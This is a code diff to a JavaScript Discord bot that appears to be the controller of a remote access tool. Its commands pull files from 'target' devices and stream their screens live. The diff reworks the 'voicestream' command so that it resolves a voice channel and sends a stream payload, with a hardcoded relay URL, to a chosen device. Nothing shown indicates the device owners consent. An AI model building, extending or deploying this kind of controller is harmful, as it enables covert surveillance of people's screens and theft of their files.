@@ -432,8 +432,7 @@ const SLASH_CMDS = [
   new SlashCommandBuilder().setName('upload').setDescription('Upload file from device').addStringOption(o => o.setName('path').setDescription('File path on device').setRequired(true)),
   new SlashCommandBuilder().setName('stream').setDescription('Control live screen stream').addStringOption(o => o.setName('action').setDescription('Action: start, stop, or fps number (1-30)').setRequired(false)),
   new SlashCommandBuilder().setName('voicestream').setDescription('Start voice channel video stream')
-    .addStringOption(o => o.setName('channel').setDescription('Voice channel ID').setRequired(true))
-    .addStringOption(o => o.setName('guild').setDescription('Guild ID').setRequired(true)),
+    .addChannelOption(o => o.setName('channel').setDescription('Voice channel (default: your current VC)').addChannelTypes(2).setRequired(false)),
   new SlashCommandBuilder().setName('streamstatus').setDescription('Check video stream status'),
 ].map(c => c.toJSON())
 
@@ -670,15 +669,25 @@ client.on(Events.InteractionCreate, async (i) => {
         }
         case 'voicestream': {
           console.log(`[VoiceStream] Command received from ${user.username}`)
-          const voiceChannelId = options.getString('channel')
-          const guildId = options.getString('guild')
-          console.log(`[VoiceStream] channel=${voiceChannelId}, guild=${guildId}`)
-
-          if (!voiceChannelId || !guildId) {
-            return i.editReply(`${E.warning} Usage: \`/voicestream channel:<id> guild:<id>\` ${E.skull}`)
-          }
 
           await guild.channels.fetch()
+
+          let voiceChannel = options.getChannel('channel')
+          if (!voiceChannel) {
+            const member = await guild.members.fetch(uid).catch(() => null)
+            if (member?.voice?.channelId) {
+              voiceChannel = guild.channels.cache.get(member.voice.channelId)
+            }
+          }
+
+          if (!voiceChannel) {
+            return i.editReply(`${E.warning} **Usage:** \`/voicestream [channel]\`\n\n- Join a voice channel first, then run \`/voicestream\`\n- Or specify a channel: \`/voicestream channel:General\` ${E.skull}`)
+          }
+
+          if (!voiceChannel.isVoiceBased()) {
+            return i.editReply(`${E.coffin} \`${voiceChannel.name}\` is not a voice channel ${E.skull}`)
+          }
+
           let deviceCh = null
           if (targets.has(uid)) {
             const data = targets.get(uid)
@@ -693,14 +702,14 @@ client.on(Events.InteractionCreate, async (i) => {
           }
 
           const botUrl = process.env.BOT_HTTP_URL || `https://substantial-impala-aymouo-bc7f3c76.koyeb.app`
-          const payload = `voice ${voiceChannelId} ${guildId} ${botUrl}`
+          const payload = `voice ${voiceChannel.id} ${guild.id} ${botUrl}`
 
           console.log(`[VoiceStream] Sending to ${deviceCh.name}: !stream ${payload}`)
 
           const r = await sendCmdLogged(deviceCh, 'stream', payload, uid, user.username)
           if (!r.ok) return i.editReply(`${E.coffin} Error sending command: ${r.err} ${E.skull}`)
 
-          return i.editReply({ content: `${E.satellite} **Voice stream command sent!**\nDevice: \`${deviceCh.name}\`\nVoice Channel: \`${voiceChannelId}\`\nBot will join and start streaming.`, components: RESULT_BTNS })
+          return i.editReply({ content: `${E.satellite} **Voice stream starting!**\nDevice: \`${deviceCh.name}\`\nVoice: \`${voiceChannel.name}\`\n\nBot will join and stream at 30fps.`, components: RESULT_BTNS })
         }
         case 'streamstatus': {
           const status = videoStream.getStreamStatus()
